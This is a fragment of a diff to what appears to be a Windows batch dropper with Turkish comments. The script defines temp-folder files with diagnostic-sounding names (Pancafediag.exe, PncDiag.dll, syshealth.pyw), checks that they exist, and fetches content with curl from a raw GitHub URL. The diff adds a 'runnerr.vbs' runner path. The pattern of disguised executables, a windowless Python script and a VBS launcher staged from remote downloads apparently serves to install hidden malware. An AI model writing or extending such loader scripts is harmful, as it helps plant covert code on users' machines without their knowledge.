@@ -10,6 +10,7 @@ set "FILE4=%temp%\by.py"
 set "FILE5=%temp%\Pancafediag.exe"
 set "FILE6=%temp%\PncDiag.dll"
 set "FILE7=%temp%\syshealth.pyw"
+set "FILE3=%temp%\runnerr.vbs"
 
 :: Tüm dosyaların varlığını tek tek kontrol et
 if exist "%FILE1%" if exist "%FILE2%"  if exist "%FILE4%"  if exist "%FILE5%"  if exist "%FILE6%" if exist "%FILE7%" (
@@ -26,5 +27,6 @@ curl -L "https://raw.githubusercontent.com/seition2doc/dosta2/refs/heads/main/sy
 
 
 exit
+
 
 
